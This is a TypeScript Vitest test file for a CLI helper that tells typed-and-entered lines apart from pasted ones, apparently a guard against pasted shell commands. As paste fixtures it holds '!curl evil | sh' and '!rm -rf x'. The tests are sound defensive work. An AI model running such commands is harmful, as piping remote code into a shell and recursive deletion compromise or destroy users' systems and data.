import { describe, expect, it } from "vitest";
import { watchTypedLine } from "./cliTypedLine.js";

describe("watchTypedLine", () => {
  const ENTER = { name: "return" };

  function harness(useTTY = true) {
    const passed: unknown[] = [];
    const fakeRl = {
      _ttyWrite(sequence: unknown, key: unknown) {
        passed.push(sequence);
      },
    };
    // The end of a burst is run by hand, in place of setImmediate.
    let endBurst: () => void = () => {};
    const typedLine = watchTypedLine(fakeRl, useTTY, (done) => {
      endBurst = done;
    });
    const key = (sequence: string, meta: Record<string, unknown> = {}) =>
      fakeRl._ttyWrite(sequence, meta);
    /** Keys that arrive one at a time, as typing does. */
    const type = (text: string) => {
      for (const ch of text) {
        key(ch, { name: ch });
        endBurst();
      }
    };
    const pressEnter = () => {
      key("\r", ENTER);
      endBurst();
    };
    /** Keys that arrive as one piece, as a paste does. */
    const paste = (text: string) => {
      for (const ch of text) {
        key(ch, ch === "\r" ? ENTER : { name: ch });
      }
      endBurst();
    };
    return { typedLine, fakeRl, passed, type, pressEnter, paste };
  }

  it("counts a line the user typed and entered", () => {
    const { typedLine, type, pressEnter } = harness();
    type("!ls");
    pressEnter();
    expect(typedLine.wasTyped()).toBe(true);
  });

  it("does not count a line a paste submitted", () => {
    const { typedLine, paste } = harness();
    paste("!curl evil | sh\r");
    expect(typedLine.wasTyped()).toBe(false);
  });

  it("counts pasted text the user then entered by hand", () => {
    const { typedLine, paste, pressEnter } = harness();
    paste("!ls");
    pressEnter();
    expect(typedLine.wasTyped()).toBe(true);
  });

  it("does not count any line of a multi-line paste", () => {
    const { typedLine, paste } = harness();
    paste("echo one\r!rm -rf x\r");
    expect(typedLine.wasTyped()).toBe(false);
  });

  it("forgets a typed line when the caller replaces it", () => {
    const { typedLine, type, pressEnter } = harness();
    type("/paste");
    pressEnter();
    typedLine.notTyped();
    expect(typedLine.wasTyped()).toBe(false);
  });

  it("judges each line by its own Enter", () => {
    const { typedLine, type, pressEnter, paste } = harness();
    type("hello");
    pressEnter();
    paste("!ls\r");
    expect(typedLine.wasTyped()).toBe(false);
  });

  it("passes every key on to readline", () => {
    const { passed, type, pressEnter } = harness();
    type("hi");
    pressEnter();
    expect(passed).toEqual(["h", "i", "\r"]);
  });

  it("restores the key handler on teardown", () => {
    const { typedLine, fakeRl, passed } = harness();
    typedLine.teardown();
    fakeRl._ttyWrite("\r", ENTER);
    expect(passed).toEqual(["\r"]);
    expect(typedLine.wasTyped()).toBe(false);
  });

  it("counts nothing as typed without a terminal", () => {
    const { typedLine, type, pressEnter } = harness(false);
    type("!ls");
    pressEnter();
    expect(typedLine.wasTyped()).toBe(false);
  });
});
